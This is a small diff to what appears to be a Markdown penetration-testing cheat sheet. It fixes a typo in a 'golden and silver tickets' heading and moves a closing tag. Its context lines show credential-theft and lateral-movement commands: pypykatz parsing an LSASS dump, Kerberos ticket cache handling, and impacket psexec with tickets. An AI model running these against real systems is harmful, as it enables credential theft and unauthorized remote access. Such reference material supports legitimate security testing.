@@ -620,7 +620,7 @@ pypykatz lsa minidump lsass.DMP
 # golden and silver tickets
 
 <details>
-  <summary> Tcikets </summary> 
+  <summary> Tickets </summary> 
   
 #### Get user SID value by using the Windows Terminal
 ```cmd
@@ -644,12 +644,13 @@ export KRB5CCNAME=<TGS_ccache_file>
 ```shell
 klist
 ```
-</details>
 
 #### Execute remote commands with any of the following by using the TGT
 ```shell
 python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 ```
+
+</details>
 
 # Printers
 <details>
